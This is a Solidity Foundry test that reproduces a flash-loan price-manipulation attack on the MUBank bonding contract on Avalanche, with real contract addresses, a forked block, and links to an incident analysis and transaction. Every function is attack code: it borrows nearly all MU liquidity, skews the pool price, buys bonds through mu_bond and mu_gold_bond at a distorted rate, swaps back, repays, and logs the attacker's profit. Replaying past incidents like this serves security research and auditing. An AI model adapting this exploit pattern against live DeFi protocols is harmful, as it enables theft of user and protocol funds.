// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BeosinAlert/status/1601422462012469248
// @TX
// https://snowtrace.io/tx/0xab39a17cdc200c812ecbb05aead6e6f574712170eafbd73736b053b168555680

interface MUBank {
    function mu_bond(address stable, uint256 amount) external;
    function mu_gold_bond(address stable, uint256 amount) external;
}

contract ContractTest is Test {
    MUBank Bank = MUBank(0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab);
    IERC20 MU = IERC20(0xD036414fa2BCBb802691491E323BFf1348C5F4Ba);
    IERC20 MUG = IERC20(0xF7ed17f0Fb2B7C9D3DDBc9F0679b2e1098993e81);
    IERC20 USDC_e = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    Uni_Router_V2 Router = Uni_Router_V2(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d); // MU MUG
    uint256 FlashLoanAmount;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("Avalanche", 23_435_294);
    }

    function testExploit() public {
        MU.approve(address(Router), type(uint256).max);
        MUG.approve(address(Router), type(uint256).max);
        USDC_e.approve(address(Router), type(uint256).max);
        USDC_e.approve(address(Bank), type(uint256).max);
        FlashLoanAmount = MU.balanceOf(address(Pair)) - 1;
        Pair.swap(FlashLoanAmount, 0, address(this), new bytes(1));
        MUGToUSDC_e();

        emit log_named_decimal_uint("[End] Attacker USDC.e balance after exploit", USDC_e.balanceOf(address(this)), 6);
    }

    function joeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        MUToUSDC_e();
        Bank.mu_bond(address(USDC_e), 3300 * 1e18);
        Bank.mu_gold_bond(address(USDC_e), 6990 * 1e18);
        USDC_eToMU();
        MU.transfer(address(Pair), FlashLoanAmount * 1000 / 997 + 1000);
    }

    function MUToUSDC_e() internal {
        address[] memory path = new address[](2);
        path[0] = address(MU);
        path[1] = address(USDC_e);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            MU.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function USDC_eToMU() internal {
        address[] memory path = new address[](2);
        path[0] = address(USDC_e);
        path[1] = address(MU);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            USDC_e.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function MUGToUSDC_e() internal {
        address[] memory path = new address[](3);
        path[0] = address(MUG);
        path[1] = address(MU);
        path[2] = address(USDC_e);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            MUG.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
